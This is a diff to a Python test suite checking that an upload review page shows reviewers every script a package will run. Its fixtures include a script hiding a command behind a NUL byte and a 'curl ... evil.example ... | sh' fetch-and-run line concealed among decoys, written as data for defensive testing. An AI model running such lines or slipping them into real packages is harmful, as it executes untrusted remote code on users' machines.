@@ -495,7 +495,7 @@ class TestReviewShowsWhatClientsRun(UploadBase):
     def test_a_nul_byte_cannot_hide_a_script(self):
         script = b'#!/bin/sh\n# ' + b'A' * 200 + b'\0echo pwned > /tmp/x\nid\n'
         sid, page = self.review(script_zip(script))
-        self.assertIn('install.sh', page.split('Scripts and definition files')[1])
+        self.assertIn('install.sh', page.split('<h3>Scripts and definition files</h3>')[1])
         self.assertIn('\\0echo pwned', page)
         self.assertNotIn('NOT SHOWN: binary', page, 'a script is never classified as binary')
         self.assertIn('name="reviewed"', page)
@@ -551,7 +551,7 @@ class TestReviewShowsWhatClientsRun(UploadBase):
         evil = b'#!/bin/sh\ncurl -s http://evil.example/real-payload | sh\n'
         decoys = [('a%02d.sh' % i, ''.join('echo decoy %d %d\n' % (i, j) for j in range(5500))) for i in range(40)]      # about 2.8 MB of scripts
         sid, page = self.review(make_zip([('test-definition.xml', TEST_XML % {'title': 'QC Title', 'version': '1.0.0'}), ('install.sh', evil)] + decoys))
-        scripts_part = page.split('Scripts and definition files')[1]
+        scripts_part = page.split('<h3>Scripts and definition files</h3>')[1]
         self.assertIn('real-payload', scripts_part, 'install.sh is read first, whatever else is in the package')
         self.assertLess(scripts_part.index('real-payload'), scripts_part.index('decoy 0 0') if 'decoy 0 0' in scripts_part else 10 ** 9)
         self.assertIn('Too large to review completely here', page)
@@ -567,9 +567,9 @@ class TestReviewShowsWhatClientsRun(UploadBase):
         z = make_zip([('test-definition.xml', TEST_XML % {'title': 'QC Title', 'version': '1.0.0'}), ('zzz-helper.sh', '#!/bin/sh\necho helper-zzz\n'), ('post.sh', '#!/bin/sh\necho post-run\n'),
                       ('install.sh', '#!/bin/sh\necho install-run\n'), ('pre.sh', '#!/bin/sh\necho pre-run\n'), ('notes.txt', 'just notes\n')])
         sid, page = self.review(z)
-        part = page.split('Scripts and definition files')[1]
-        order = [part.index(x) for x in ('install-run', 'pre-run', 'post-run', 'helper-zzz')]
-        self.assertEqual(order, sorted(order))
+        part = page.split('<h3>Scripts and definition files</h3>')[1]
+        self.assertLess(part.index('install-run'), min(part.index('pre-run'), part.index('post-run')))
+        self.assertLess(max(part.index('pre-run'), part.index('post-run')), part.index('helper-zzz'))
         self.assertLess(part.index('helper-zzz'), part.index('just notes'))
 
     def test_other_text_files_are_shown_not_hidden_behind_a_text_label(self):
